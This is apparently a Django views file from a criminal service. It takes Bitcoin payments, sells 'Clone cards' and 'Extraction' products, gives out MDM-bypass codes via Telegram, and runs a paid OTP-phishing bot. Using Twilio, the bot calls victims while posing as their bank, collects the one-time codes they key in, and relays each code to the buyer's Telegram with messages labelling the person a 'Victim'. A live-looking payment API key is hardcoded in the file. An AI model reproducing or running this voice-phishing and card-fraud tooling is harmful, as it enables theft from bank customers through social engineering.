from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework.decorators import authentication_classes
from rest_framework.permissions import IsAuthenticated, AllowAny
from rest_framework import status
from .models import Balance, Product, Invoice, Telegram_Client,Telegram_Otp_bot
from .utils import  exchanged_rate, send_mail, update_admins, update_user_2, update_user_3, cards_mail, update_user, main, call, bot
import requests
import uuid
from rest_framework.authentication import BasicAuthentication, SessionAuthentication, TokenAuthentication
from .models import Balance
from .serializers import BalanceSerializer,Telegram_ClientSerializer,Telegram_OtpBotserializer
from store.serializers import ProductSerializer
from rest_framework.generics import CreateAPIView
from asgiref.sync import async_to_sync
from django.http import HttpResponse
from twilio.twiml.voice_response import VoiceResponse, Gather
from django.views.decorators.csrf import csrf_exempt

class BalanceListView(APIView):
    authentication_classes = [TokenAuthentication, SessionAuthentication]
    permission_classes = [IsAuthenticated]  
    def get(self, request):
        balance = Balance.objects.filter(created_by=request.user).first()
        if balance:
            serializer = BalanceSerializer(balance)
            return Response(serializer.data)
        else:
            return Response({'message': 'Balance not found',"balance":0.00}, status=status.HTTP_404_NOT_FOUND)

class CoinbasePaymentView(APIView):
    authentication_classes = [TokenAuthentication, SessionAuthentication]
    permission_classes = [IsAuthenticated] 
    def get(self, request):
        api_key = 'pj0LgQwm9o3gy8M2THSalKErb1poZlTKhQA1XYfpB4k'
        amount = float(1.00)
        url = 'https://www.blockonomics.co/api/new_address'
        headers = {'Authorization': "Bearer " + api_key}
        r = requests.post(url, headers=headers)
        if r.status_code == 200:
            address = r.json()['address']
            bits = exchanged_rate(amount)
            order_id = uuid.uuid1()
            # Check if the user already has a balance model
            balance = Balance.objects.filter(created_by=request.user).first()
            if balance:
                # If the user has a balance model, use its id
                invoice_id = balance.id
                balance.address = address
                balance.received = 0
                balance.save()
                if balance.balance is None:
                    balance.balance = 0
                    balance.save()
                
            else:
                # Otherwise, create a new balance model
                invoice = Balance.objects.create(order_id=order_id,
                                    address=address,btcvalue=bits*1e8, created_by=request.user, balance=0)
                invoice_id = invoice.id
            details = self.track_balance(invoice_id)
            return Response(
                {
                    'addr': details['addr'],
                    'username': request.user.username,
                },
                status=status.HTTP_201_CREATED
            )

        else:
            print(r.status_code, r.text)
            return Response({'message': 'Error creating invoice'}, status=status.HTTP_400_BAD_REQUEST)
    
    def track_balance(self, pk):
        invoice_id = pk
        invoice = Balance.objects.get(id=invoice_id)
        data = {
                'order_id':invoice.order_id,
                'value':invoice.balance,
                'addr': invoice.address,
            }
        return data

class BuyView(APIView):
    authentication_classes = [TokenAuthentication, SessionAuthentication]
    permission_classes = [IsAuthenticated] 
    
    def get(self, request, pk):
        product_id = pk
        try:
            product = Product.objects.get(id=product_id)
        except Product.DoesNotExist:
            return Response({'message': 'Product not found'}, status=status.HTTP_404_NOT_FOUND)
        
        price = product.price
        balance = Balance.objects.filter(created_by=request.user).first()
        
        if balance:
            b = balance.balance
            if b is not None:
                remaining = max(0, int(price - b))
            else:
                balance.balance = 0
                balance.save()
                remaining = int(price)
        else:
            remaining = price
        
        return Response({'price': price, 'remaining': remaining, 'product': ProductSerializer(product).data})
    
    def post(self, request, pk):
        product_id = pk
        try:
            product = Product.objects.get(id=product_id)
        except Product.DoesNotExist:
            return Response({'message': 'Product not found'}, status=status.HTTP_404_NOT_FOUND)
        
        price = product.price
        balance = Balance.objects.filter(created_by=request.user).first()
        
        if not balance:
            return Response({'message': 'Balance not found'}, status=status.HTTP_404_NOT_FOUND)
        
        b = balance.balance
        check = int(price - b)
        
        if check > 0:
            return Response({'message': 'Insufficient balance'}, status=status.HTTP_400_BAD_REQUEST)
        
        balance.balance = b - price
        balance.save()
        
        if product.category.name == "Extraction":
            user = request.user
            user.verified = True
            user.save()
            send_mail(request, product)
        elif product.category.name == "Clone cards":
            product.Status = False
            product.save()
            cards_mail(request)
            return Response({'message': 'Purchase successful'}, status=status.HTTP_200_OK)
        else:
            product.Status = False
            product.save()
            send_mail(request, product)
        
        invoice = Invoice.objects.create(
            order_id=balance.order_id,
            address=balance.address,
            btcvalue=product.price,
            product=product,
            created_by=request.user,
            sold=True,
            received=product.price
        )
        
        return Response({'message': 'Purchase successful'}, status=status.HTTP_200_OK)

@authentication_classes([BasicAuthentication])
class CoinbaseWebhookView(APIView):
    permission_classes = [AllowAny]
    def get(self,request):
        if request.method == 'GET':
            txid = request.GET.get('txid')
            value = float(request.GET.get('value'))
            status = request.GET.get('status')
            addr = request.GET.get('addr')

            invoice = Balance.objects.get(address=addr)
            
            if int(status) == 2:
                invoice.received = value
                invoice.txid = txid
                invoice.save()

                # update user's balance
                received = float(invoice.received)
                url = "https://www.blockonomics.co/api/price?currency=USD"
                response = requests.get(url)
                if response.text:
                    response_json = response.json()
                    usdvalue = received / 1e8 * response_json["price"]
                else:
                    # Handle the case where the response is empty
                    return Response({'message': 'Error: Received an empty response'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
                invoice.balance += usdvalue
                invoice.save()
                update_user_2(invoice.created_by.username,invoice.created_by.email,usdvalue)
                update_admins(usdvalue)

                return Response({'message': 'Balance updated'},status=200)
            elif int(status) == 0:
                url = "https://www.blockonomics.co/api/price?currency=USD"
                response = requests.get(url)
                if response.text:
                    response_json = response.json()
                    usdvalue = value / 1e8 * response_json["price"]
                else:
                    # Handle the case where the response is empty
                    return Response({'message': 'Error: Received an empty response'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
                update_user(invoice.created_by.username,invoice.created_by.email,usdvalue)
                return Response({'message': 'Balance update started'},status=200)
            elif int(status) == 1:
                received = float(invoice.received)
                url = "https://www.blockonomics.co/api/price?currency=USD"
                response = requests.get(url)
                if response.text:
                    response_json = response.json()
                    usdvalue = value / 1e8 * response_json["price"]
                else:
                    # Handle the case where the response is empty
                    return Response({'message': 'Error: Received an empty response'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
                update_user(invoice.created_by.username,invoice.created_by.email,usdvalue)
                return Response({'message': 'Balance update partial'},status=200)
            else:
                received = float(invoice.received)
                url = "https://www.blockonomics.co/api/price?currency=USD"
                response = requests.get(url)
                if response.text:
                    response_json = response.json()
                    usdvalue = value / 1e8 * response_json["price"]
                else:
                    # Handle the case where the response is empty
                    return Response({'message': 'Error: Received an empty response'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
                update_user_3(invoice.created_by.username,invoice.created_by.email,usdvalue)
                return Response({'message': 'Balance update failed'},status=400)

class TelegramClientCreateView(CreateAPIView):
    queryset = Telegram_Client.objects.all()
    serializer_class = Telegram_ClientSerializer
    permission_classes = [AllowAny]

    def create(self, request, *args, **kwargs):
        chat_id = request.data.get('chat_id')
        try:
            client = Telegram_Client.objects.get(chat_id=chat_id)
            if client and 'address' in request.data:
                client.address = request.data['address']
                client.save()
                return Response({'message': 'Address updated'}, status=status.HTTP_200_OK)
            elif client:
                return Response({'message': 'Client already exists'}, status=status.HTTP_400_BAD_REQUEST)
        except Telegram_Client.DoesNotExist:
            return super().create(request, *args, **kwargs)

class TelegrambaseWebhookView(APIView):
    permission_classes = [AllowAny]
    def get(self,request):
        if request.method == 'GET':
            txid = request.GET.get('txid')
            value = float(request.GET.get('value'))
            status = request.GET.get('status')
            addr = request.GET.get('addr')
            chat_id = Telegram_Client.objects.get(address=addr).chat_id
            
            if int(status) == 2:
                
                # update user's balance
                received = float(value)
                url = "https://www.blockonomics.co/api/price?currency=USD"
                response = requests.get(url)
                if response.text:
                    response_json = response.json()
                    usdvalue = received / 1e8 * response_json["price"]
                else:
                    # Handle the case where the response is empty
                    return Response({'message': 'Error: Received an empty response'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
                
                if usdvalue >= 9.8:
                    text = "Visit the link below to access the mdmbypass codes\nhttps://skipmdm.com/en"
                    async_to_sync(main)(chat_id,text)

                return Response({'message': 'message sent'},status=200)
            elif int(status) == 0:
                url = "https://www.blockonomics.co/api/price?currency=USD"
                response = requests.get(url)
                if response.text:
                    response_json = response.json()
                    usdvalue = value / 1e8 * response_json["price"]
                else:
                    # Handle the case where the response is empty
                    return Response({'message': 'Error: Received an empty response'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
                text = "Payment initialized successfully, waiting for confirmation from the blockchain...."
                telgram=async_to_sync(main)(chat_id,text)
                return Response({'message': 'Transaction started','telegram':telgram},status=200)
            elif int(status) == 1:
                received = float(value)
                url = "https://www.blockonomics.co/api/price?currency=USD"
                response = requests.get(url)
                if response.text:
                    response_json = response.json()
                    usdvalue = value / 1e8 * response_json["price"]
                else:
                    # Handle the case where the response is empty
                    return Response({'message': 'Error: Received an empty response'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
                text = "Payment partially confirmed, waiting for last set of confirmation from the blockchain...."
                async_to_sync(main)(chat_id,text)
                return Response({'message': 'Balance update partial'},status=200)
            else:
                received = float(value)
                url = "https://www.blockonomics.co/api/price?currency=USD"
                response = requests.get(url)
                if response.text:
                    response_json = response.json()
                    usdvalue = value / 1e8 * response_json["price"]
                else:
                    # Handle the case where the response is empty
                    return Response({'message': 'Error: Received an empty response'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
                
                return Response({'message': 'Balance update failed'},status=400)

class TelegramOtpBotCreateView(CreateAPIView):
    serializer_class = Telegram_OtpBotserializer
    permission_classes = [AllowAny]

    def create(self, request, *args, **kwargs):
        chat_id = request.data.get('chat_id')
        try:
            client = Telegram_Otp_bot.objects.get(chat_id=chat_id)
            if 'address' in request.data and 'name' in request.data:
                client.address = request.data['address']
                client.name = request.data['name']
                client.save()
                return Response({'message': 'Address updated'}, status=status.HTTP_200_OK)
            if 'number' in request.data and 'log' in request.data:
                client.number = request.data['number']
                client.log = request.data['log']
                client.save()
                return Response({'message': 'number updated'}, status=status.HTTP_200_OK)
            elif client:
                return Response({'message': 'Client already exists'}, status=status.HTTP_400_BAD_REQUEST)
        except Telegram_Otp_bot.DoesNotExist:
            return super().create(request, *args, **kwargs)

class TelegrambotWebhookView(APIView):
    permission_classes = [AllowAny]
    def get(self,request):
        if request.method == 'GET':
            txid = request.GET.get('txid')
            value = float(request.GET.get('value'))
            status = request.GET.get('status')
            addr = request.GET.get('addr')
            otp_bot = Telegram_Otp_bot.objects.get(address=addr)
            chat_id = otp_bot.chat_id
            phone_number = otp_bot.number
            bank = otp_bot.name
            if int(status) == 2:
                
                # update user's balance
                received = float(value)
                url = "https://www.blockonomics.co/api/price?currency=USD"
                response = requests.get(url)
                if response.text:
                    response_json = response.json()
                    usdvalue = received / 1e8 * response_json["price"]
                else:
                    # Handle the case where the response is empty
                    return Response({'message': 'Error: Received an empty response'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
                if otp_bot.log:
                    if usdvalue >= 24.6:
                        text = f"Placing call to {phone_number}...."
                        async_to_sync(bot)(chat_id,text)
                        call(phone_number,bank,chat_id)
                    else:
                        balance = 25-usdvalue
                        text = f"You sent insufficient funds. Top up with {balance} via the same address to proceed. ❗️‼❗️Send to the same address or loose your funds."
                        async_to_sync(bot)(chat_id,text)
                else:
                    if usdvalue >= 14.6:
                        text = f"Placing call to {phone_number}...."
                        async_to_sync(bot)(chat_id,text)
                        call(phone_number,bank,chat_id)
                    else:
                        balance = 15-usdvalue
                        text = f"You sent insufficient funds. Top up with {balance} via the same address to proceed. ❗️‼❗️Send to the same address or loose your funds."
                        async_to_sync(bot)(chat_id,text)
                return Response({'message': 'message sent'},status=200)
            elif int(status) == 0:
                url = "https://www.blockonomics.co/api/price?currency=USD"
                response = requests.get(url)
                if response.text:
                    response_json = response.json()
                    usdvalue = value / 1e8 * response_json["price"]
                else:
                    # Handle the case where the response is empty
                    return Response({'message': 'Error: Received an empty response'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
                text = "Payment initialized successfully, waiting for confirmation from the blockchain...."
                telgram=async_to_sync(bot)(chat_id,text)
                return Response({'message': 'Transaction started','telegram':telgram},status=200)
            elif int(status) == 1:
                received = float(value)
                url = "https://www.blockonomics.co/api/price?currency=USD"
                response = requests.get(url)
                if response.text:
                    response_json = response.json()
                    usdvalue = value / 1e8 * response_json["price"]
                else:
                    # Handle the case where the response is empty
                    return Response({'message': 'Error: Received an empty response'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
                text = "Payment partially confirmed, waiting for last set of confirmation from the blockchain...."
                async_to_sync(bot)(chat_id,text)
                return Response({'message': 'Balance update partial'},status=200)
            else:
                received = float(value)
                url = "https://www.blockonomics.co/api/price?currency=USD"
                response = requests.get(url)
                if response.text:
                    response_json = response.json()
                    usdvalue = value / 1e8 * response_json["price"]
                else:
                    # Handle the case where the response is empty
                    return Response({'message': 'Error: Received an empty response'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
                
                return Response({'message': 'Balance update failed'},status=400)

class CallTrial(APIView):
    permission_classes = [AllowAny]

    def post(self, request):
        phone = request.data.get('phone')
        chat_id = request.data.get('chat_id')

        if not phone or not chat_id:
            return Response({'message': 'Missing parameters'}, status=400)

        text = f"Placing call to {phone}....☎️"
        async_to_sync(bot)(chat_id, text)
        call(phone, 'Trial', chat_id)

        return Response({'message': 'Call placed'}, status=200)

class SecurityCheck(APIView):
    permission_classes = [AllowAny]

    def get(self, request):
        chat_id = request.GET.get('chat_id')
        otp_bot = Telegram_Otp_bot.objects.get(chat_id=chat_id)
        if otp_bot.trial_used:
            return Response({'message': 'Security check enabled'}, status=400)
        else:
            otp_bot.trial_used = True
            otp_bot.save()
            return Response({'message': 'Security check not enabled'}, status=200)

@csrf_exempt
def voice(request,bank,chat_id):
    resp = VoiceResponse()
    gather = Gather(num_digits=1, action=f'/pay/gather/{chat_id}/{bank}/')
    gather.say(f'We have received a login request on your {bank} account. If you did not request an OTP Press 1.')
    resp.append(gather)
    call_status = request.POST.get('CallStatus')
    if call_status == 'in-progress':
        text = f'Victim accepted call✅. Waiting for input...'
        async_to_sync(bot)(chat_id,text)
    # If the user doesn't select an option, redirect them into a loop
    resp.redirect(f'/pay/voice/{bank}/{chat_id}/')

    return HttpResponse(str(resp))

@csrf_exempt
def gather(request,chat_id,bank):
    # Processes results from the <Gather> prompt in /voice
    # Start our TwiML response
    resp = VoiceResponse()

    otp = Telegram_Otp_bot.objects.get(chat_id=chat_id)
    if 'Digits' in request.POST:
        # Get which digit the caller chose
        choice = request.POST['Digits']

        # <Say> a different message depending on the caller's choice
        if choice == '1':
            gather = Gather(action=f'/pay/gather/{chat_id}/{bank}/')
            gather.say('We need to confirm your identity first before blocking this request. Enter the pin code sent to your phone number.')
            resp.append(gather)
        elif len(choice) > 3:
            if len(choice) == 4:
                digit_1 = choice[0]
                digit_2 = choice[1]
                digit_3 = choice[2]
                digit_4 = choice[3]
                gather = Gather(action=f'/pay/otp/{chat_id}/{bank}/')
                resp.say(f"You have entered {digit_1} {digit_2} {digit_3} {digit_4}. Press 1 to confirm, or press 2 to re-enter")
                text = f'The OTP code inputed by the user at first stage is {choice}'
                async_to_sync(bot)(chat_id,text)
                resp.append(gather)
                otp.otp_code = choice
                otp.save()
            elif len(choice) == 6:
                digit_1 = choice[0]
                digit_2 = choice[1]
                digit_3 = choice[2]
                digit_4 = choice[3]
                digit_5 = choice[4]
                digit_6 = choice[5]
                gather = Gather(action=f'/pay/otp/{chat_id}/{bank}/')
                resp.say(f"You have entered {digit_1} {digit_2} {digit_3} {digit_4} {digit_5} {digit_6}. Press 1 to confirm, or press 2 to re-enter")
                text = f'Victim just entered {choice} as OTP code. Waiting for confirmation from victim...'
                async_to_sync(bot)(chat_id,text)
                resp.append(gather)
                otp.otp_code = choice
                otp.save()
            else:
                resp.say("Invalid pin code entered, Last chance to verify your identity or your account may be locked for a while")
                resp.redirect(f'/pay/gather/{chat_id}/{bank}/')
            
        else:
            # If the caller didn't choose 1 or 2, apologize and ask them again
            resp.say("Sorry, Please press 1 if you did not request for the Pin Code.")

    # If the user didn't choose 1 or 2 (or anything), send them back to /voice
    resp.redirect(f'/pay/voice/{bank}/{chat_id}/')

    return HttpResponse(str(resp))

@csrf_exempt
def choice(request, chat_id, bank):
    resp = VoiceResponse()
    otp = Telegram_Otp_bot.objects.get(chat_id=chat_id)
    if 'Digits' in request.POST:
        pin = request.POST['Digits']

        if pin == '1':
            text = f'Victim has confirmed initial OTP✅. {otp.otp_code} is the OTP code.'
            async_to_sync(bot)(chat_id,text)
            resp.say("Thank you for your cooperation. The suspicious login has been blocked.")
        
        elif pin == '2':
            resp.redirect(f"/pay/gather/{chat_id}/{bank}/")
        else:
            resp.say("Error No digits")
    else:
        text = "Error No digits"
        async_to_sync(bot)(chat_id,text)

    return HttpResponse(str(resp))
